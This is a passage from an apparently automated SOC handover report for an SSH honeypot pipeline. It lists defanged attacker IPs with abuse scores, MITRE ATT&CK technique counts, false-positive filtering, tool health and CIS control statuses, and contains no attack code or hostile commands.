| `172.90.128[.]97` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `182.73.164[.]228` | IN | KALINGA MEDIA & ENTERTAINMENT PVT. LTD. | **100** ⚠️ | 50 |
| `218.58.73[.]238` | CN | China Unicom Shandong province network | **100** ⚠️ | 50 |
| `194.165.16[.]162` | PA | Flyservers S.A. | **100** ⚠️ | 50 |
| `196.188.93[.]169` | ET | Ethio Telecom | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 158 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 117 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 25 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 24 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 22 |

---

## 🔕 False Positive Summary (51 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 35 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 280 cases |
| Tool 34  | Credential Extractor        | ✅ 150 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 22 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 158 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 51 filtered (18.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 107 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 116 priority case(s) shown individually · 47 recon entry/entries in table (15 group(s) consolidating 81 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-04T06:32:34Z_
